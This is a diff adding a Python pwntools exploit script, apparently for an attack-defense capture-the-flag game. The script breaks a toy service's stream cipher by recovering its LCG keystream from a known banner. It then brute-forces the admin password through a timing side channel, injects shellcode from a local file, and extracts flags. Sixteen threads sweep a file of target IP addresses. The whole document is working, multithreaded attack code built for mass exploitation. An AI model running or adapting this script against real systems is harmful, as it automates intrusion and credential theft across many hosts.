@@ -1,0 +1,476 @@
+#!/usr/bin/env python3
+from __future__ import annotations
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
+from pwn import *
+import binascii
+import re
+import struct
+import string
+import sys
+import fcntl  # 用于文件锁，保证多线程/多进程安全
+
+context.log_level = "info"
+context.arch = "amd64"
+# HOST = "39.101.70.58"
+# PORT = 16128
+BINARY = "./somebox"
+context.binary = BINARY
+
+
+def load_ips(filename):
+    ip_list = []
+    with open(filename, 'r', encoding='utf-8') as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split()
+            if len(parts) == 2:
+                ip, port = parts
+                try:
+                    port_int = int(port)
+                except ValueError:
+                    log.warning(f"Skipping invalid port for {ip}: {port}")
+                    continue
+                ip_list.append((ip, port_int))
+    return ip_list
+
+
+def pop_one_ip(filename: str):
+    """
+    从 filename（默认 csnote_ips.txt）中「取出一行 ip port」，并把这一行从文件中删除。
+    返回 (ip, port_int) 或 None（表示没有更多目标）。
+    带文件锁，适合多线程 / 多进程抢任务。
+    """
+    try:
+        with open(filename, "r+", encoding="utf-8") as f:
+            # 独占锁，避免并发读写冲突
+            fcntl.flock(f, fcntl.LOCK_EX)
+
+            lines = f.readlines()
+            # 找第一行非空行
+            idx = 0
+            while idx < len(lines) and not lines[idx].strip():
+                idx += 1
+
+            if idx >= len(lines):
+                # 没有目标了
+                fcntl.flock(f, fcntl.LOCK_UN)
+                return None
+
+            first_line = lines[idx].strip()
+            # 删除这一行，其他行保持原样
+            new_lines = lines[:idx] + lines[idx + 1:]
+
+            f.seek(0)
+            f.truncate()
+            f.writelines(new_lines)
+            f.flush()
+
+            fcntl.flock(f, fcntl.LOCK_UN)
+
+        parts = first_line.split()
+        if len(parts) != 2:
+            log.warning(f"Skipping invalid line in {filename!r}: {first_line!r}")
+            return None
+
+        ip, port_str = parts
+        try:
+            port_int = int(port_str)
+        except ValueError:
+            log.warning(f"Skipping invalid port for {ip}: {port_str}")
+            return None
+
+        return ip, port_int
+
+    except FileNotFoundError:
+        log.warning(f"{filename} not found.")
+        return None
+    except Exception as e:
+        log.failure(f"pop_one_ip() failed: {e}")
+        return None
+
+
+# Known plaintext banner (215 bytes, trailing space after "Your choice:")
+BANNER_PT = (
+    b"================= TOY ENCRYPTED SERVICE =================\n"
+    b"1) Echo back what you send\n"
+    b"2) Admin login\n"
+    b"3) MagicCode runner\n"
+    b"4) Show config\n"
+    b"5) Quit\n"
+    b"\n"
+    b"---------------------------------------------------------\n"
+    b"Your choice: "
+)
+
+# ---------------------------------------------------------------------------
+# Bit helpers / LCG inversion
+# ---------------------------------------------------------------------------
+
+def ror64(x, n):
+    return ((x >> n) | (x << (64 - n))) & 0xFFFFFFFFFFFFFFFF
+
+
+def inv_xorshift(y, k):
+    x = y
+    shift = k
+    while shift < 64:
+        x ^= x >> shift
+        shift *= 2
+    return x
+
+
+def invert_complex_transform(v7):
+    t = inv_xorshift(v7, 16)
+    t = inv_xorshift(t, 8)
+    t = inv_xorshift(t, 4)
+    t = inv_xorshift(t, 2)
+    return inv_xorshift(t, 1)
+
+
+def recover_state_from_block(block_int):
+    val = ror64(block_int, 7)
+    high_v7 = (val >> 32) & 0xFFFFFFFF
+    low_v7 = (val & 0xFFFFFFFF) ^ high_v7
+    v7 = (high_v7 << 32) | low_v7
+    return invert_complex_transform(v7)
+
+
+def count_trailing_zeros(x):
+    if x == 0:
+        return 64
+    return (x & -x).bit_length() - 1
+
+
+def modinv(a, m):
+    def egcd(x, y):
+        if x == 0:
+            return (y, 0, 1)
+        g, p, q = egcd(y % x, x)
+        return (g, q - (y // x) * p, p)
+
+    g, x, _ = egcd(a, m)
+    if g != 1:
+        raise ValueError("no inverse")
+    return x % m
+
+
+def recover_ab_for_lane(states):
+    if len(states) < 3:
+        return None
+    pairs = []
+    for i in range(len(states) - 2):
+        x0, x1, x2 = states[i], states[i + 1], states[i + 2]
+        dx = (x1 - x0) & 0xFFFFFFFFFFFFFFFF
+        dy = (x2 - x1) & 0xFFFFFFFFFFFFFFFF
+        pairs.append((dx, dy))
+
+    best_idx = -1
+    min_tz = 65
+    for i, (dx, _) in enumerate(pairs):
+        if dx == 0:
+            continue
+        tz = count_trailing_zeros(dx)
+        if tz < min_tz:
+            min_tz = tz
+            best_idx = i
+    if best_idx == -1:
+        return None
+
+    dx_best, dy_best = pairs[best_idx]
+    k = min_tz
+    if (dy_best & ((1 << k) - 1)) != 0:
+        return None
+
+    mod_reduced = 1 << (64 - k)
+    dx_odd = dx_best >> k
+    dy_reduced = dy_best >> k
+    a_base = (dy_reduced * modinv(dx_odd, mod_reduced)) & (mod_reduced - 1)
+
+    step = mod_reduced
+    for i in range(1 << k):
+        a_cand = a_base + i * step
+        if all((a_cand * dx) & 0xFFFFFFFFFFFFFFFF == dy for dx, dy in pairs):
+            x0, x1 = states[0], states[1]
+            b = (x1 - a_cand * x0) & 0xFFFFFFFFFFFFFFFF
+            return {"A": a_cand, "B": b}
+    return None
+
+
+# ---------------------------------------------------------------------------
+# Keystream PRNG
+# ---------------------------------------------------------------------------
+
+class ToyPRNG:
+    def __init__(self, params):
+        self.lanes = params  # list of dicts with A,B,X
+        self.idx = 0
+
+    def get_keystream_block(self):
+        lane = self.lanes[self.idx]
+        x = lane["X"]
+
+        v6 = x
+        t = v6 ^ (v6 >> 1)
+        t ^= t >> 2
+        t ^= t >> 4
+        t ^= t >> 8
+        v7 = t ^ (t >> 16)
+        val = v7 ^ (v7 >> 32)
+        k_block = ((val << 7) | (val >> 57)) & 0xFFFFFFFFFFFFFFFF
+
+        lane["X"] = (lane["A"] * x + lane["B"]) & 0xFFFFFFFFFFFFFFFF
+        self.idx = (self.idx + 1) % 4
+        return k_block.to_bytes(8, "little")
+
+    def encrypt(self, data: bytes):
+        if isinstance(data, str):
+            data = data.encode()
+        out = bytearray()
+        ks = b""
+        while len(ks) < len(data):
+            ks += self.get_keystream_block()
+        for a, b in zip(data, ks):
+            out.append(a ^ b)
+        return bytes(out)
+
+    decrypt = encrypt
+
+
+# ---------------------------------------------------------------------------
+# Recovery from banner
+# ---------------------------------------------------------------------------
+
+def recover_cipher(tube):
+    tube.recvuntil(b"token:")
+    tube.sendline(b"icqcb7c320de268ecb6e421212869a01")
+    tube.recvline()
+    print("aaa")
+    enc_hex = tube.recv(430)
+    while len(enc_hex) < 430:
+        enc_hex += tube.recv(430 - len(enc_hex))
+
+    # Drop unencrypted newline after the hex banner to keep offsets aligned
+    try:
+        leftover = tube.recvline(timeout=0.2)
+        if leftover not in (b"", None):
+            context.log_level == "debug" and log.debug(f"Flushed newline: {leftover!r}")
+    except EOFError:
+        pass
+
+    enc_bytes = bytes.fromhex(enc_hex.decode())
+    keystream = bytearray(enc_bytes[i] ^ BANNER_PT[i] for i in range(len(BANNER_PT)))
+
+    lanes = [[], [], [], []]
+    limit = (len(keystream) // 8) * 8
+    for i in range(0, limit, 8):
+        block = int.from_bytes(keystream[i: i + 8], "little")
+        state = recover_state_from_block(block)
+        lanes[(i // 8) % 4].append(state)
+
+    params = []
+    for i in range(4):
+        res = recover_ab_for_lane(lanes[i])
+        if not res:
+            raise RuntimeError(f"Failed to recover lane {i}")
+        last = lanes[i][-1]
+        current = (res["A"] * last + res["B"]) & 0xFFFFFFFFFFFFFFFF
+        params.append({"A": res["A"], "B": res["B"], "X": current})
+
+    cipher = ToyPRNG(params)
+    cipher.idx = (limit // 8) % 4
+    if len(keystream) % 8:
+        cipher.get_keystream_block()
+    return cipher
+
+
+# ---------------------------------------------------------------------------
+# Core interactions
+# ---------------------------------------------------------------------------
+
+def build_io():
+    if len(sys.argv) > 1 and sys.argv[1] == "remote":
+        return remote(HOST, PORT)
+    return process(BINARY)
+
+
+def timing_attack(tube, cipher, charset=None, max_len=64):
+    if charset is None:
+        charset = string.ascii_letters + string.digits + "{}_!@#$%^&*()-_=+"
+
+    def send_enc(data):
+        tube.sendline(cipher.encrypt(data).hex().encode())
+
+    def recv_plain(label=""):
+        line = tube.recvline()
+        if not line:
+            raise EOFError(f"Disconnected while reading {label}")
+        ct = bytes.fromhex(line.strip().decode())
+        pt = cipher.decrypt(ct)
+        log.debug(f"{label}: {pt!r}")
+        return pt
+
+    def login_once(password, username=b"admin"):
+        send_enc("2")
+        recv_plain("username prompt")
+        send_enc(username)
+        recv_plain("password prompt")
+        send_enc(password)
+        return recv_plain("login result")
+
+    def parse_ms(resp: bytes):
+        m = re.search(rb"Login failed \((\d+) ms\)", resp)
+        return int(m.group(1)) if m else None
+
+    known = ""
+    while len(known) < max_len:
+        best_ch, best_ms = None, -1
+        for ch in charset:
+            guess = (known + ch).encode()
+            resp = login_once(guess)
+
+            if resp.startswith(b"Welcome, admin!"):
+                return known + ch
+
+            ms = parse_ms(resp)
+            if ms is None:
+                log.warning(f"Timing parse failed for {ch!r}: {resp!r}")
+                continue
+            if ms > best_ms:
+                best_ms, best_ch = ms, ch
+
+        if best_ch is None:
+            raise RuntimeError("Timing attack stalled (no candidate improved timing)")
+        if best_ms == 0 and not known:
+            raise RuntimeError("All candidates leaked 0 ms; check username/charset.")
+
+        known += best_ch
+        log.info(f"Progress: {known!r} (delay {best_ms} ms)")
+
+    raise RuntimeError("Password length exceeded without success")
+
+
+def pwn_target(ip, port):
+    tube = None
+    log.info(f"[{ip}:{port}] Starting exploit thread")
+    try:
+        tube = remote(ip, port)
+        cipher = recover_cipher(tube)
+        log.success(f"[{ip}:{port}] Keystream/LCG recovered and cipher synced.")
+
+        password = timing_attack(tube, cipher)
+        log.success(f"[{ip}:{port}] Recovered password: {password}")
+
+        # Final login to ensure admin session
+        def send_enc(data):
+            tube.sendline(cipher.encrypt(data).hex().encode())
+
+        def recv_plain(label=""):
+            line = tube.recvline()
+            if not line:
+                raise EOFError(f"Disconnected while reading {label}")
+            pt = cipher.decrypt(bytes.fromhex(line.strip().decode()))
+            log.debug(f"{label}: {pt!r}")
+            return pt
+
+        send_enc("2")
+        recv_plain("username prompt (final)")
+        send_enc("admin")
+        recv_plain("password prompt (final)")
+        send_enc(password)
+        resp = recv_plain("login result (final)")
+        log.info(f"[{ip}:{port}] Login response: {resp!r}")
+
+        send_enc("3")
+        recv_plain("MagicCode prompt")
+        with open("./myshellcode", "rb") as f:
+            orw = f.read()
+        send_enc(orw)
+        resp = recv_plain("MagicCode response")
+        log.info(f"[{ip}:{port}] MagicCode response: {resp!r}")
+        send_enc("4")
+        resp = recv_plain("sandbox")
+
+        def parse_hex_response(line: str) -> str:
+            # 抽取 hex 部分（只要连续 hex 字符即可）
+            m = re.search(r'([0-9a-fA-F]{2,})', line)
+            if not m:
+                return None
+
+            hex_str = m.group(1)
+
+            try:
+                data = binascii.unhexlify(hex_str)
+                return data.decode(errors='replace').rstrip('\n')
+            except Exception:
+                return None
+
+        flag = parse_hex_response(resp.decode())
+        if flag:
+            log.success(f"[{ip}:{port}] Extracted flag: {flag}")
+        else:
+            log.warning(f"[{ip}:{port}] Failed to extract flag from response.")
+        return flag
+    except Exception as exc:
+        log.failure(f"[{ip}:{port}] Exploit failed: {exc}")
+        return None
+    finally:
+        try:
+            if tube:
+                tube.close()
+        except Exception:
+            pass
+
+
+# ---------------------------------------------------------------------------
+# Worker：从文件中不断弹出 IP 并打
+# ---------------------------------------------------------------------------
+
+def worker_thread(worker_id, filename, flags_list, flags_lock):
+    while True:
+        target = pop_one_ip(filename)
+        if target is None:
+            log.info(f"[worker {worker_id}] no more targets.")
+            break
+
+        ip, port = target
+        flag = pwn_target(ip, port)
+        if flag:
+            with flags_lock:
+                flags_list.append(flag)
+
+
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
+
+if __name__ == "__main__":
+    filename = "csnote_ips.txt"
+    flags = []
+    flags_lock = Lock()
+
+    max_workers = 16
+
+    log.info(f"Using {max_workers} workers with task file: {filename}")
+
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = [
+            executor.submit(worker_thread, i, filename, flags, flags_lock)
+            for i in range(max_workers)
+        ]
+        for fut in as_completed(futures):
+            try:
+                fut.result()
+            except Exception as exc:
+                log.failure(f"[worker thread crashed] {exc}")
+
+    print("Collected flags:")
+    for flag in flags:
+        print(flag)
+
+    with open("csnote_flags.txt", "w", encoding="utf-8") as f:
+        for flag in flags:
+            f.write(flag + "\n")
